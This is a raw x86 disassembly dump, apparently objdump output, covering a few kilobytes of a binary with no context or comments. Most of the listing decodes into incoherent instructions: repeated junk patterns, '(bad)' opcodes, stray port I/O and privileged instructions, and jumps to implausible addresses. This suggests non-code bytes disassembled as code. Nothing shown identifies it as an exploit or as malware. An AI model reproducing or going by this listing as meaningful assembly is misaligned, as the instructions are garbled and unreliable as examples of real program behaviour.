  4145da:	xchg   ecx,eax
  4145db:	sub    esi,DWORD PTR [ecx+0x7e]
  4145de:	fs xor eax,0x26634875
  4145e4:	cs dec edx
  4145e6:	pop    esi
  4145e7:	cs sub eax,0xa0ee8e4
  4145ed:	jmp    0x414f24
  4145f2:	enter  0x5,0x0
  4145f6:	enter  0x5,0x0
  4145fa:	fadd   DWORD PTR ds:0x5d80000
  414600:	add    BYTE PTR [eax],al
  414602:	enter  0x5,0x0
  414606:	enter  0x5,0x0
  41460a:	cwde   
  41460b:	add    eax,0x5980000
  414610:	add    BYTE PTR [eax],al
  414612:	mov    BYTE PTR ds:0x5880000,al
  414618:	add    BYTE PTR [eax],al
  41461a:	cwde   
  41461b:	add    eax,0x5980000
  414620:	add    BYTE PTR [eax],al
  414622:	mov    BYTE PTR ds:0x5880000,al
  414628:	add    BYTE PTR [eax],al
  41462a:	lds    ecx,FWORD PTR [edx-0x16e694b2]
  414630:	sub    BYTE PTR [eax+eax*1],al
  414633:	push   ds
  414634:	ins    BYTE PTR es:[edi],dx
  414635:	push   esp
  414636:	in     al,dx
  414637:	xor    eax,0x772d6268
  41463c:	mov    BYTE PTR [edi],al
  41463e:	push   edi
  41463f:	inc    ebp
  414640:	mov    edi,0xb28c1105
  414645:	gs in  al,0x80
  414648:	dec    edi
  414649:	dec    edi
  41464a:	mov    ds,WORD PTR [eax]
  41464c:	or     eax,0xd180000
  414651:	add    BYTE PTR [eax],al
  414653:	or     BYTE PTR ds:0xd080000,cl
  414659:	add    BYTE PTR [eax],al
  41465b:	sbb    BYTE PTR ds:0xd180000,cl
  414661:	add    BYTE PTR [eax],al
  414663:	or     BYTE PTR ds:0xd080000,cl
  414669:	add    BYTE PTR [eax],al
  41466b:	xor    DWORD PTR [edx-0x5dceffff],esp
  414671:	add    DWORD PTR [eax],eax
  414673:	xor    DWORD PTR [edx-0x5dceffff],esp
  414679:	add    DWORD PTR [eax],eax
  41467b:	xor    DWORD PTR [edx-0x5dceffff],esp
  414681:	add    DWORD PTR [eax],eax
  414683:	xor    DWORD PTR [edx-0x5dceffff],esp
  414689:	add    DWORD PTR [eax],eax
  41468b:	xor    DWORD PTR [edx-0x5dceffff],esp
  414691:	add    DWORD PTR [eax],eax
  414693:	xor    DWORD PTR [edx+0x31000001],esp
  414699:	mov    ds:0xa2310001,al
  41469e:	add    DWORD PTR [eax],eax
  4146a0:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146a6:	add    DWORD PTR [eax],eax
  4146a8:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146ae:	add    DWORD PTR [eax],eax
  4146b0:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146b6:	add    DWORD PTR [eax],eax
  4146b8:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146be:	add    DWORD PTR [eax],eax
  4146c0:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146c6:	add    DWORD PTR [eax],eax
  4146c8:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146ce:	add    DWORD PTR [eax],eax
  4146d0:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146d6:	add    DWORD PTR [eax],eax
  4146d8:	xor    DWORD PTR [edx-0x5dceffff],esp
  4146de:	add    DWORD PTR [eax],eax
  4146e0:	xor    DWORD PTR [edx+0x9310001],esp
  4146e6:	out    0x3,eax
  4146e8:	xor    DWORD PTR [ecx],ecx
  4146ea:	out    0x3,eax
  4146ec:	xor    DWORD PTR [ecx],ecx
  4146ee:	out    0x3,eax
  4146f0:	xor    DWORD PTR [ecx],ecx
  4146f2:	out    0x3,eax
  4146f4:	xor    DWORD PTR [ecx],ecx
  4146f6:	out    0x3,eax
  4146f8:	xor    DWORD PTR [ecx],ecx
  4146fa:	out    0x3,eax
  4146fc:	add    BYTE PTR [ecx],dh
  4146fe:	or     edi,esp
  414700:	add    esi,DWORD PTR [ecx]
  414702:	or     edi,esp
  414704:	add    esi,DWORD PTR [ecx]
  414706:	or     edi,esp
  414708:	add    esi,DWORD PTR [ecx]
  41470a:	or     edi,esp
  41470c:	add    esi,DWORD PTR [ecx]
  41470e:	or     edi,esp
  414710:	add    esi,DWORD PTR [ecx]
  414712:	or     edi,esp
  414714:	add    esi,DWORD PTR [ecx]
  414716:	or     edi,esp
  414718:	add    esi,DWORD PTR [ecx]
  41471a:	or     edi,esp
  41471c:	add    esi,DWORD PTR [ecx]
  41471e:	or     edi,esp
  414720:	add    esi,DWORD PTR [ecx]
  414722:	or     edi,esp
  414724:	add    esi,DWORD PTR [ecx]
  414726:	or     edi,esp
  414728:	add    esi,DWORD PTR [ecx]
  41472a:	or     edi,esp
  41472c:	add    esi,DWORD PTR [ecx]
  41472e:	or     edi,esp
  414730:	add    esi,DWORD PTR [ecx]
  414732:	or     edi,esp
  414734:	add    esi,DWORD PTR [ecx]
  414736:	or     edi,esp
  414738:	add    esi,DWORD PTR [ecx]
  41473a:	or     edi,esp
  41473c:	add    esi,DWORD PTR [ecx]
  41473e:	or     edi,esp
  414740:	add    esi,DWORD PTR [ecx]
  414742:	or     edi,esp
  414744:	add    esi,DWORD PTR [ecx]
  414746:	or     edi,esp
  414748:	add    esi,DWORD PTR [ecx]
  41474a:	or     edi,esp
  41474c:	add    esi,DWORD PTR [ecx]
  41474e:	or     eax,ebx
  414750:	adc    DWORD PTR [eax-0x3],esp
  414753:	ror    DWORD PTR ds:0x50883931,cl
  414759:	mov    al,ds:0x95518e3e
  41475e:	or     DWORD PTR [eax],eax
  414760:	jns    0x414762
  414762:	push   0x39
  414764:	bound  ecx,QWORD PTR [ebx+0x4c752632]
  41476a:	aas    
  41476b:	cmp    eax,0xf8e5e977
  414770:	xor    BYTE PTR ds:0x4467b6e8,bl
  414776:	cmp    dh,BYTE PTR es:[ecx-0x17]
  41477a:	(bad)  
  41477c:	xor    ch,dh
  41477e:	leave  
  41477f:	cld    
  414780:	xor    al,0xf1
  414782:	xor    ah,dh
  414784:	xor    edx,edi
  414786:	(bad)  
  414787:	mov    dh,0x60
  414789:	or     ecx,DWORD PTR [esi]
  41478b:	out    0x31,al
  41478d:	fidiv  DWORD PTR [edx]
  41478f:	and    eax,0x2a601d63
  414794:	push   DWORD PTR [bp+si]
  414797:	cmp    eax,0x95efa63
  41479c:	ins    BYTE PTR es:[edi],dx
  41479d:	push   cs
  41479e:	dec    ebx
  41479f:	sub    al,BYTE PTR [eax]
  4147a1:	mov    eax,0xf8fff97c
  4147a6:	push   ebp
  4147a7:	cmp    BYTE PTR [ecx-0x22],dh
  4147aa:	inc    ebx
  4147ab:	cmp    esp,DWORD PTR [eax+ebx*1+0x35]
  4147af:	and    DWORD PTR [ebx-0x3b],esp
  4147b2:	push   ss
  4147b3:	and    al,0x0
  4147b5:	mov    esp,0xcc692723
  4147ba:	adc    eax,0x15bb6409
  4147bf:	sub    al,0x6d
  4147c1:	(bad)  
  4147c2:	xor    bh,BYTE PTR ds:0x700b472
  4147c8:	cmp    eax,0xb63d966e
  4147cd:	xor    al,bl
  4147cf:	and    eax,0x32d82ee7
  4147d4:	cs ins BYTE PTR es:[edi],dx
  4147d6:	jle    0x414830
  4147d8:	sub    dh,BYTE PTR [edi+0x0]
  4147db:	mov    edi,0xca30fff0
  4147e0:	mov    esi,0xb2c63531
  4147e5:	std    
  4147e6:	jb     0x414798
  4147e8:	in     al,dx
  4147e9:	arpl   WORD PTR [edi+0x57],bp
  4147ec:	or     eax,0xb14b322d
  4147f1:	xor    dh,BYTE PTR [esi]
  4147f3:	inc    edi
  4147f4:	mov    ch,0x36
  4147f6:	add    BYTE PTR [ebx-0x1b],ch
  4147f9:	jno    0x414864
  4147fb:	sbb    esi,ecx
  4147fd:	push   DWORD PTR [edx+0x5]
  414800:	sti    
  414801:	outs   dx,BYTE PTR ds:[esi]
  414802:	push   0x60fb71
  414807:	std    
  414808:	jmp    0x414878
  41480a:	je     0x414831
  41480c:	(bad)  
  41480d:	jmp    DWORD PTR [edx+0x3f]
  414810:	clc    
  414811:	outs   dx,DWORD PTR ds:[esi]
  414812:	jne    0x414858
  414814:	loopne 0x414887
  414816:	add    BYTE PTR [eax],bh
  414818:	jmp    DWORD PTR [esi+ebp*2+0x2b]
  41481c:	loopne 0x41488c
  41481e:	jae    0x4147b8
  414820:	std    
  414821:	fs addr16 aaa 
  414824:	loopne 0x414897
  414826:	add    BYTE PTR [esi],dh
  414828:	cli    
  414829:	push   0x74
  41482b:	add    BYTE PTR [edx-0x14],ch
  41482e:	imul   ebp,DWORD PTR [eax+ebx*2-0x14],0x6d
  414833:	addr16 jne 0x41481b
  414836:	jmp    FWORD PTR [ecx+0x75]
  414839:	(bad)  
  41483a:	jo     0x4148af
  41483c:	pop    ecx
  41483d:	or     DWORD PTR ds:0x2fbc4b32,ebp
  414843:	xor    ebx,DWORD PTR [eax-0xe]
  414846:	addr16 popa 
  414848:	test   al,ah
  41484a:	jne    0x4148b1
  41484c:	call   0x63e1:0xb5726609
  414853:	outs   dx,DWORD PTR ds:[esi]
  414854:	xor    DWORD PTR [ebp+0x36886901],ecx
  41485a:	sub    eax,0x24a2a363
  41485f:	jno    0x4147f6
  414861:	mov    WORD PTR [ecx],es
  414863:	jno    0x4147fb
  414865:	jg     0x41488d
  414867:	arpl   WORD PTR [ebx-0x7e8cc95e],ax
  41486d:	inc    ebp
  41486e:	imul   edx,DWORD PTR ss:[eax+0x44],0x4
  414873:	imul   ebx,DWORD PTR [eax+0x3f],0x2c
  414877:	pop    edi
  414878:	push   esp
  414879:	test   BYTE PTR [ebx],0x61
  41487c:	dec    ecx
  41487d:	inc    ebp
  41487e:	and    eax,0x2aa25471
  414883:	outs   dx,BYTE PTR ds:[esi]
  414884:	cmp    eax,0x546e3645
  414889:	inc    BYTE PTR [ebx]
  41488b:	push   0x46
  41488d:	cvttps2pi mm6,QWORD PTR [ebx+0x0]
  414891:	adc    BYTE PTR [edx+0x7127327],ah
  414897:	cmp    DWORD PTR [ebp+0x24],ebp
  41489a:	mov    ds:0xaf0c6c23,al
  41489f:	xor    al,0x63
  4148a1:	adc    eax,0x25f23a2
  4148a6:	add    eax,0xb60d5f26
  4148ab:	add    DWORD PTR [ecx-0x3],esi
  4148ae:	shl    BYTE PTR [ebx],0x75
  4148b1:	ror    bh,1
  4148b3:	xor    al,0x0
  4148b5:	and    DWORD PTR [edx],edx
  4148b7:	hlt    
  4148b8:	das    
  4148b9:	and    DWORD PTR [edx],edx
  4148bb:	add    al,0x70
  4148bd:	fsubr  QWORD PTR [edi+0x31]
  4148c0:	ins    BYTE PTR es:[edi],dx
  4148c1:	aam    0xa1
  4148c3:	sub    ebp,DWORD PTR [ebp-0x3d]
  4148c6:	lds    esp,FWORD PTR [edx]
  4148c8:	outs   dx,BYTE PTR ds:[esi]
  4148c9:	xor    esp,ecx
  4148cb:	and    ah,BYTE PTR [edi-0x43]
  4148ce:	or     BYTE PTR [edi-0x73c15ffd],cl
  4148d4:	cs xchg edx,eax
  4148d6:	aaa    
  4148d7:	out    0x22,eax
  4148d9:	mov    al,ds:0x9e267b21
  4148de:	or     DWORD PTR [ecx-0x7bc27fca],ecx
  4148e4:	xor    eax,0x228c2131
  4148e9:	xchg   DWORD PTR [esi],ebp
  4148eb:	jge    0x4148f0
  4148ed:	sub    DWORD PTR [esi],0x37523457
  4148f3:	out    0xf8,eax
  4148f5:	add    BYTE PTR ds:0x25f91dfc,bl
  4148fb:	cld    
  4148fc:	out    0x2b,al
  4148fe:	bound  esp,QWORD PTR [ebx]
  414900:	cmp    esp,DWORD PTR [edi]
  414902:	inc    ebx
  414903:	or     DWORD PTR [ebx+0x31],ecx
  414906:	aas    
  414907:	cs inc ebx
  414909:	cmp    esi,DWORD PTR [ecx]
  41490b:	sub    bh,BYTE PTR ds:0x1e2e4328
  414911:	add    al,0x25
  414913:	and    DWORD PTR [esi],ecx
  414915:	das    
  414916:	push   es
  414917:	cmp    bh,ah
  414919:	and    cl,BYTE PTR [edi]
  41491b:	sub    al,0x4
  41491d:	xor    BYTE PTR [eax],ah
  41491f:	or     DWORD PTR [edx],ecx
  414921:	sub    al,0xee
  414923:	or     ebp,DWORD PTR ss:[ebx]
  414926:	adc    cl,BYTE PTR [ecx]
  414928:	or     esp,DWORD PTR [ebx]
  41492a:	mov    cr0,esp
  41492d:	xor    BYTE PTR [ecx],dh
  41492f:	cli    
  414930:	pop    ss
  414931:	repz pop ds
  414933:	or     ecx,edx
  414935:	xlat   BYTE PTR es:[ebx]
  414937:	and    al,al
  414939:	sub    edx,edx
  41493b:	ss out 0x34,eax
  41493e:	into   
  41493f:	and    cl,dh
  414941:	das    
  414942:	ror    BYTE PTR [eax],cl
  414944:	iret   
  414945:	and    dl,bh
  414947:	and    al,BYTE PTR [eax]
  414949:	enter  0x90a,0x6f
  41494d:	enter  0x3df4,0x71
  414951:	mov    eax,ds:0x995f2132
  414956:	bound  edi,QWORD PTR [edx]
  414958:	add    BYTE PTR [eax+eax*1-0x7f8dc2ad],al
  41495f:	pop    edx
  414960:	or     DWORD PTR [eax-0x78],esi
  414963:	inc    ebp
  414964:	cmp    BYTE PTR [eax],al
  414966:	mov    BYTE PTR [ebx+0x52],dl
  414969:	pop    edi
  41496a:	mov    BYTE PTR [ebx+0x9],dl
  41496d:	ss mov ah,0xfe
  414970:	stc    
  414971:	xor    DWORD PTR [eax],ebx
  414973:	xor    eax,0x17486b52
  414978:	sub    eax,0x240ce95f
  41497d:	je     0x4149c0
  41497f:	add    al,0x23
  414981:	gs jmp 0x46af739e
  414987:	sbb    BYTE PTR [edi],dh
  414989:	add    BYTE PTR [esi+ecx*1+0x3d],al
  41498d:	push   0x71090344
  414992:	pop    ss
  414993:	pop    esi
  414994:	and    al,0x70
  414996:	and    BYTE PTR ds:0x621a631f,ch
  41499c:	sub    ah,BYTE PTR [ecx+0x8]
  41499f:	sub    eax,0x5215633c
  4149a4:	and    al,0x6b
  4149a6:	add    al,0x2d
  4149a8:	cmp    DWORD PTR [ebp+0x2],ebp
  4149ab:	dec    eax
  4149ac:	push   ds
  4149ad:	ins    DWORD PTR es:[edi],dx
  4149ae:	push   DWORD PTR [edx]
  4149b0:	sub    ch,BYTE PTR [esi+edx*8+0x24]
  4149b4:	es ja  0x414985
  4149b7:	sub    edx,esp
  4149b9:	call   DWORD PTR [edi]
  4149bb:	fs jecxz 0x4149ec
  4149be:	sbb    BYTE PTR [eax],al
  4149c0:	sub    eax,0x8b00731e
  4149c5:	cli    
  4149c6:	pop    esp
  4149c7:	outs   dx,BYTE PTR ds:[esi]
  4149c8:	outs   dx,DWORD PTR ds:[esi]
  4149c9:	push   es
  4149ca:	push   0x68f67465
  4149cf:	gs dec eax
  4149d1:	loopne 0x414a43
  4149d3:	jae    0x4149a1
  4149d5:	in     al,0x6d
  4149d7:	add    dl,al
  4149d9:	in     al,dx
  4149da:	outs   dx,BYTE PTR ds:[esi]
  4149db:	ins    DWORD PTR es:[edi],dx
  4149dc:	mov    cl,0xe3
  4149de:	pusha  
  4149df:	add    BYTE PTR [edi-0x4091a308],dl
  4149e5:	loopne 0x4149e6
  4149e7:	jae    0x414996
  4149e9:	div    BYTE PTR [ebx+0x69]
  4149ec:	mov    dh,0xea
  4149ee:	jmp    DWORD PTR [eax+0x78]
  4149f1:	imul   BYTE PTR [ebx+0x65]
  4149f4:	fdivr  st,st(0)
  4149f6:	arpl   WORD PTR fs:[eax+0x6d6c6be0],ax
  4149fd:	or     eax,0xe6696570
  414a02:	pusha  
  414a03:	add    BYTE PTR [ebx],cl
  414a05:	loopne 0x414a65
  414a07:	jb     0x414a76
  414a09:	icebp  
  414a0a:	push   DWORD PTR [eax]
  414a0c:	enter  0x71ea,0x61
  414a10:	imul   esp,eax,0xffffffff
  414a13:	jbe    0x414a56
  414a15:	stc    
  414a16:	imul   ebp,DWORD PTR [ecx+0x39],0xfffffff8
  414a1a:	jmp    FWORD PTR [eax+0x34]
  414a1d:	loop   0x414a94
  414a1f:	gs inc ecx
  414a21:	loop   0x414a93
  414a23:	xor    al,BYTE PTR [eax]
  414a25:	cwde   
  414a26:	jecxz  0x414a8c
  414a28:	arpl   WORD PTR [edi],si
  414a2a:	stc    
  414a2b:	pusha  
  414a2c:	add    BYTE PTR [esi-0x41c9cc45],bh
  414a32:	mov    ebx,0xeb8d6cfd
  414a37:	imul   esi,DWORD PTR gs:[esi+0x5],0xd4316163
  414a3f:	sub    BYTE PTR [ebp-0x30],dh
  414a42:	fadd   DWORD PTR [ecx]
  414a44:	les    di,DWORD PTR [esi+0x7cd6772a]
  414a4b:	hlt    
  414a4c:	call   ecx
  414a4e:	outs   dx,BYTE PTR ds:[esi]
  414a4f:	xor    ch,BYTE PTR [eax-0x3a]
  414a52:	jae    0x414a7c
  414a54:	add    BYTE PTR [ecx-0x66a0d67f],bl
  414a5a:	add    DWORD PTR [ecx],0x31878e70
  414a60:	add    BYTE PTR [ebx-0x7d8ed7d2],dl
  414a66:	cdq    
  414a67:	sub    esp,DWORD PTR [ebp+0x31]
  414a6a:	test   BYTE PTR ds:0x2d84895f,ch
  414a70:	pop    edi
  414a71:	mov    DWORD PTR [edx+0x52627730],esp
  414a77:	and    DWORD PTR [ecx+0x4c],esp
  414a7a:	adc    DWORD PTR [ebx+ebp*2],eax
  414a7d:	push   eax
  414a7e:	dec    esi
  414a7f:	cmp    BYTE PTR [eax+0x4c],ch
  414a82:	push   edi
  414a83:	add    al,0x61
  414a85:	push   eax
  414a86:	pop    eax
  414a87:	and    DWORD PTR [eax+eax*1+0x50],esp
  414a8b:	mov    ds:0xf04d6730,al
  414a90:	and    al,0x72
  414a92:	xor    esp,esi
  414a94:	sub    ah,BYTE PTR [edx+0x14]
  414a97:	adc    al,0x38
  414a99:	add    BYTE PTR [edi],cl
  414a9b:	push   DWORD PTR [ecx]
  414a9d:	arpl   WORD PTR [edi],sp
  414a9f:	std    
  414aa0:	xor    DWORD PTR [eax],eax
  414aa2:	adc    BYTE PTR [ebx],dl
  414aa4:	sub    BYTE PTR [esi+0x16],ah
  414aa7:	sbb    al,BYTE PTR [edx+esi*2]
  414aaa:	adc    BYTE PTR [ebx],al
  414aac:	sub    al,0x63
  414aae:	or     eax,0x85f2fa2
  414ab3:	mov    al,0x1f
  414ab5:	ins    DWORD PTR es:[edi],dx
  414ab6:	out    0x8,al
  414ab8:	out    0x24,eax
  414aba:	loop   0x414add
  414abc:	shl    DWORD PTR [edx],cl
  414abe:	jecxz  0x414ac8
  414ac0:	xlat   BYTE PTR ds:[ebx]
  414ac1:	neg    BYTE PTR es:[esi]
  414ac4:	aam    0x37
  414ac6:	xor    DWORD PTR [ebx],ebp
  414ac8:	enter  0xda37,0x29
  414acc:	int    0x3
  414ace:	rcr    BYTE PTR [edi],1
  414ad0:	(bad)  
  414ad1:	sub    dh,cl
  414ad3:	and    eax,0x228e21e7
  414ad8:	xchg   ebx,eax
  414ad9:	es sahf 
  414adb:	or     DWORD PTR [edx-0x73d36fd4],ebx
  414ae1:	xor    DWORD PTR [esi+0x9],eax
  414ae4:	jl     0x414b10
  414ae6:	nop
  414ae7:	and    al,0x8c
  414ae9:	cmp    dh,BYTE PTR [ecx]
  414aeb:	sub    edx,DWORD PTR [eax+0x1e920037]
  414af1:	mov    WORD PTR [ebx],es
  414af3:	mov    DWORD PTR [esi],esp
  414af5:	jnp    0x414b26
  414af7:	pop    esp
  414af8:	cli    
  414af9:	out    0x26,al
  414afb:	pop    edx
  414afc:	and    cl,BYTE PTR [ebp+0x27]
  414aff:	dec    edx
  414b00:	or     DWORD PTR [ebx+0x23],ecx
  414b03:	dec    eax
  414b04:	and    BYTE PTR [ebx+0x23],dl
  414b07:	xor    DWORD PTR [eax+ecx*2],edi
  414b0a:	das    
  414b0b:	popw   ds
  414b0d:	xor    ebp,DWORD PTR [esi+ebx*2]
  414b10:	or     DWORD PTR [edx+0x2d],ecx
  414b13:	dec    edx
  414b14:	cmp    DWORD PTR [eax+0x33],ecx
  414b17:	xor    DWORD PTR ds:0x201a2310,esp
  414b1d:	or     eax,0x8353128
  414b22:	cmp    eax,DWORD PTR ds:0x17041920
  414b28:	and    cl,bh
  414b2a:	sbb    cl,BYTE PTR ss:[ecx]
  414b2d:	adc    DWORD PTR ds:0xba001f09,ebp
  414b33:	xor    ebp,0xffffffff
  414b36:	cli    
  414b37:	sbb    ebp,DWORD PTR [edx]
  414b39:	push   0x2520c8
  414b3e:	retf   
  414b3f:	push   cs
  414b40:	sub    BYTE PTR [esi-0x3e],ch
  414b43:	arpl   di,si
  414b45:	xor    ecx,ebp
  414b47:	add    ch,BYTE PTR [edi+ebx*2]
  414b4a:	retf   0x2c1a
  414b4d:	jno    0x414b38
  414b4f:	adc    DWORD PTR [esi],ebx
  414b51:	ins    DWORD PTR es:[edi],dx
  414b52:	lds    eax,FWORD PTR [eax]
  414b54:	xor    ah,BYTE PTR [edi]
  414b56:	ins    BYTE PTR es:[edi],dx
  414b57:	mov    esi,0xe9722a65
  414b5c:	popa   
  414b5d:	sub    BYTE PTR [ebp-0x72],ch
  414b60:	data16 sub dh,BYTE PTR [edx-0x17]
  414b64:	push   eax
  414b65:	dec    esi
  414b66:	outs   dx,BYTE PTR ds:[esi]
  414b67:	mov    BYTE PTR [esi+ecx*2+0x0],bl
  414b6b:	xchg   ebx,eax
  414b6c:	push   ebx
  414b6d:	and    ah,BYTE PTR [ebx+0x7a]
  414b70:	xor    cl,BYTE PTR [esi+0x71]
  414b73:	lea    ecx,[esi+ecx*2+0x71]
  414b77:	test   DWORD PTR [ecx+ecx*1],edx
  414b7a:	jbe    0x414bcc
  414b7c:	push   cs
  414b7d:	xor    eax,0x91c5b6d
  414b82:	ins    BYTE PTR es:[edi],dx
  414b83:	inc    esi
  414b84:	or     esp,DWORD PTR ds:0xde353f6d
  414b8a:	xor    edx,edi
  414b8c:	std    
  414b8d:	xor    esp,DWORD PTR [ebx-0x17]
  414b90:	(bad)  
  414b93:	cli    
  414b94:	mov    esp,0x6139ffdf
  414b99:	dec    esi
  414b9a:	jb     0x414bb9
  414b9c:	pop    edi
  414b9d:	sub    ch,BYTE PTR [ecx-0x17]
  414ba0:	push   ebx
  414ba1:	sub    ch,BYTE PTR [ebp+0x1b]
  414ba4:	push   edx
  414ba5:	sub    al,BYTE PTR [eax]
  414ba7:	push   ss
  414ba8:	pop    esp
  414ba9:	pop    ds
  414baa:	outs   dx,BYTE PTR ds:[esi]
  414bab:	add    BYTE PTR ds:0x296cfff7,dh
  414bb1:	jmp    0x7274:0x5256962
  414bb8:	add    BYTE PTR [ecx],dh
  414bba:	jecxz  0x414c20
  414bbc:	je     0x414c0f
  414bbe:	or     ch,BYTE PTR [ebx+0x6e]
  414bc1:	ins    BYTE PTR es:[edi],dx
  414bc2:	(bad)  [ebp+0x65]
  414bc5:	dec    eax
  414bc6:	mov    ch,0x2f
  414bc8:	xor    edi,DWORD PTR [ecx-0x1c]
  414bcb:	pop    esi
  414bcc:	add    BYTE PTR [ebx-0x1e],bh
  414bcf:	arpl   WORD PTR fs:[ebx-0x17],sp
  414bd3:	ins    DWORD PTR es:[edi],dx
  414bd4:	add    BYTE PTR [edx-0x7],dh
  414bd7:	ins    DWORD PTR es:[edi],dx
  414bd8:	imul   ebp,edi,0xc062fff3
  414bde:	repz fs jae 0x414bea
  414be2:	cli    
  414be3:	pop    esp
  414be4:	jae    0x414ba1
  414be6:	cli    
  414be7:	das    
  414be8:	jb     0x414b9e
  414bea:	or     DWORD PTR [ebp+0x75],ebx
  414bed:	mov    ebx,esi
  414bef:	outs   dx,BYTE PTR fs:[esi]
  414bf1:	or     bh,dh
  414bf3:	outs   dx,DWORD PTR ds:[esi]
  414bf4:	popa   
  414bf5:	jp     0x414bd6
  414bf7:	je     0x414bf9
  414bf9:	mov    ecx,0x7e69690d
  414bfe:	add    eax,0xe17a6569
  414c03:	outs   dx,BYTE PTR fs:[esi]
  414c05:	enter  0x6aea,0x6f
  414c09:	ja     0x414bec
  414c0b:	pusha  
  414c0c:	add    BYTE PTR [esi-0x9],dh
  414c0f:	fs outs dx,BYTE PTR gs:[esi]
  414c12:	jmp    0xe2b14c85
  414c17:	outs   dx,DWORD PTR ds:[esi]
  414c18:	gs cwde 
  414c1a:	mul    BYTE PTR [edi+0x61]
  414c1d:	add    BYTE PTR [edx+eiz*8],bh
  414c20:	push   0x6ddc2e00
  414c25:	je     0x414c58
  414c27:	std    
  414c28:	sub    DWORD PTR [esi+ebx*1-0x60],esp
  414c2c:	and    eax,0x2b1b166d
  414c31:	outs   dx,BYTE PTR ds:[esi]
  414c32:	push   ss
  414c33:	mov    al,ds:0x4035f29
  414c38:	pop    ds
  414c39:	ja     0x414c6c
  414c3b:	mov    bl,0x28
  414c3d:	ins    DWORD PTR es:[edi],dx
  414c3e:	fidivr DWORD PTR [esp+edi*1-0xee8da00]
  414c45:	xor    al,0x31
  414c47:	retf   0x712a
  414c4a:	aam    0xcf
  414c4c:	sub    DWORD PTR [eax],eax
  414c4e:	aad    0x6c
  414c50:	imul   edi,DWORD PTR es:[eax-0x3198e261],0x9d5f2dc8
  414c5b:	mov    ds:0x9a9d0024,al
  414c60:	xor    BYTE PTR [esi-0x6b],ch
  414c63:	test   DWORD PTR [ebx],esi
  414c65:	add    BYTE PTR [edx-0x678dd36e],ah
  414c6b:	xchg   esi,eax
  414c6c:	add    DWORD PTR [edx-0x70],esp
  414c6f:	xchg   esp,eax
  414c70:	sbb    eax,0x20a28567
  414c75:	outs   dx,BYTE PTR ds:[esi]
  414c76:	jge    0x414cf5
  414c78:	xor    eax,DWORD PTR [eax]
  414c7a:	push   eax
  414c7b:	sub    al,0x2d
  414c7d:	push   0x395456
  414c82:	add    BYTE PTR [edx+0x3b],dl
  414c85:	ss jbe 0x414cd4
  414c88:	dec    esi
  414c89:	xor    BYTE PTR [ebx+0x31],ah
  414c8c:	dec    edx
  414c8d:	daa    
  414c8e:	popa   
  414c8f:	pop    edx
  414c90:	cmp    eax,0x3b410039
  414c95:	das    
  414c96:	arpl   WORD PTR [ebx-0x5e],ax
  414c99:	and    esp,DWORD PTR [ebx+0x1f]
  414c9c:	dec    eax
  414c9d:	and    DWORD PTR [ebx+0x18],ebp
  414ca0:	or     DWORD PTR ds:0xe1d1604,edx
  414ca6:	xor    dl,BYTE PTR [edx]
  414ca8:	xor    al,BYTE PTR [esi]
  414caa:	das    
  414cab:	cs or  eax,ebx
  414cae:	xor    al,BYTE PTR [ebx+0x34]
  414cb1:	mov    edx,0x1033311e
  414cb6:	xor    al,0x12
  414cb8:	aaa    
  414cb9:	out    0x20,eax
  414cbb:	rcr    BYTE PTR [edx],cl
  414cbd:	add    al,0x35
  414cbf:	into   
  414cc0:	aaa    
  414cc1:	out    0x2c,eax
  414cc3:	iret   
  414cc4:	and    esi,eax
  414cc6:	sub    ebx,ebp
  414cc8:	or     al,bl
  414cca:	xor    dl,dl
  414ccc:	sar    DWORD PTR ss:[edx],cl
  414ccf:	push   ss
  414cd0:	or     edx,ecx
  414cd2:	xor    eax,0x2ab329d2
  414cd7:	mov    edi,0x9c21e725
  414cdc:	sbb    al,0xc9
  414cde:	and    ah,BYTE PTR [ebx-0x69e077f7]
  414ce4:	and    eax,0x31003488
  414ce9:	aaa    
  414cea:	xchg   BYTE PTR [edi],ch
  414cec:	xchg   esi,eax
  414ced:	push   ds
  414cee:	add    BYTE PTR [ebx],0x80
  414cf1:	sbb    eax,0x37923a88
  414cf6:	out    0x30,eax
  414cf8:	mov    ?,WORD PTR [eax]
  414cfa:	mov    ebp,DWORD PTR [eax]
  414cfc:	pop    edx
  414cfd:	or     DWORD PTR [edi+0x35],esi
  414d00:	xchg   BYTE PTR [edx],ah
  414d02:	pop    edx
  414d03:	pop    ds
  414d04:	xor    DWORD PTR [edi],ebp
  414d06:	pop    edi
  414d07:	and    eax,0x2745275f
  414d0c:	xor    DWORD PTR [eax],edi
  414d0e:	dec    eax
  414d0f:	daa    
  414d10:	inc    edx
  414d11:	es push ebx
  414d13:	add    al,0x4a
  414d15:	and    dl,BYTE PTR [edx+0x1f]
  414d18:	xor    DWORD PTR ds:0x1d594800,esp
  414d1e:	pop    edi
  414d1f:	cmp    ch,BYTE PTR ds:0x3e0c7226
  414d25:	sbb    eax,DWORD PTR [eax]
  414d27:	adc    eax,0x1d743a36
  414d2c:	cmp    dh,BYTE PTR cs:[ecx+ebp*8+0x4f]
  414d31:	dec    esp
  414d32:	jbe    0x414d40
  414d34:	inc    edi
  414d35:	and    al,0x61
  414d37:	adc    ch,BYTE PTR ds:0x190c6e1e
  414d3d:	push   ds
  414d3e:	jbe    0x414d44
  414d40:	sub    eax,0xbdf5f25
  414d45:	and    eax,0x1d1bcc00
  414d4a:	ins    DWORD PTR es:[edi],dx
  414d4b:	fild   WORD PTR [eax]
  414d4d:	das    
  414d4e:	or     DWORD PTR [ecx-0x3f],esp
  414d51:	pop    ss
  414d52:	aaa    
  414d53:	popa   
  414d54:	shl    DWORD PTR [edx],1
  414d56:	and    esi,DWORD PTR [edx-0x30]
  414d59:	pop    ss
  414d5a:	sbb    esp,DWORD PTR [ecx+ebp*8+0x51]
  414d5e:	sbb    al,0x64
  414d60:	jmp    0x9db273ab
  414d65:	dec    ebx
  414d66:	sbb    esi,DWORD PTR [edi-0x17]
  414d69:	dec    eax
  414d6a:	sbb    al,0x6e
  414d6c:	mov    WORD PTR [edx],?
  414d6e:	push   ds
  414d6f:	mov    bh,BYTE PTR [si]
  414d72:	sbb    al,0x71
  414d74:	xchg   esi,eax
  414d75:	push   eax
  414d76:	xor    eax,0xf8fcbb00
  414d7b:	xor    DWORD PTR [ebx+0x745faae4],edi
  414d81:	or     al,0x27
  414d83:	ins    BYTE PTR es:[edi],dx
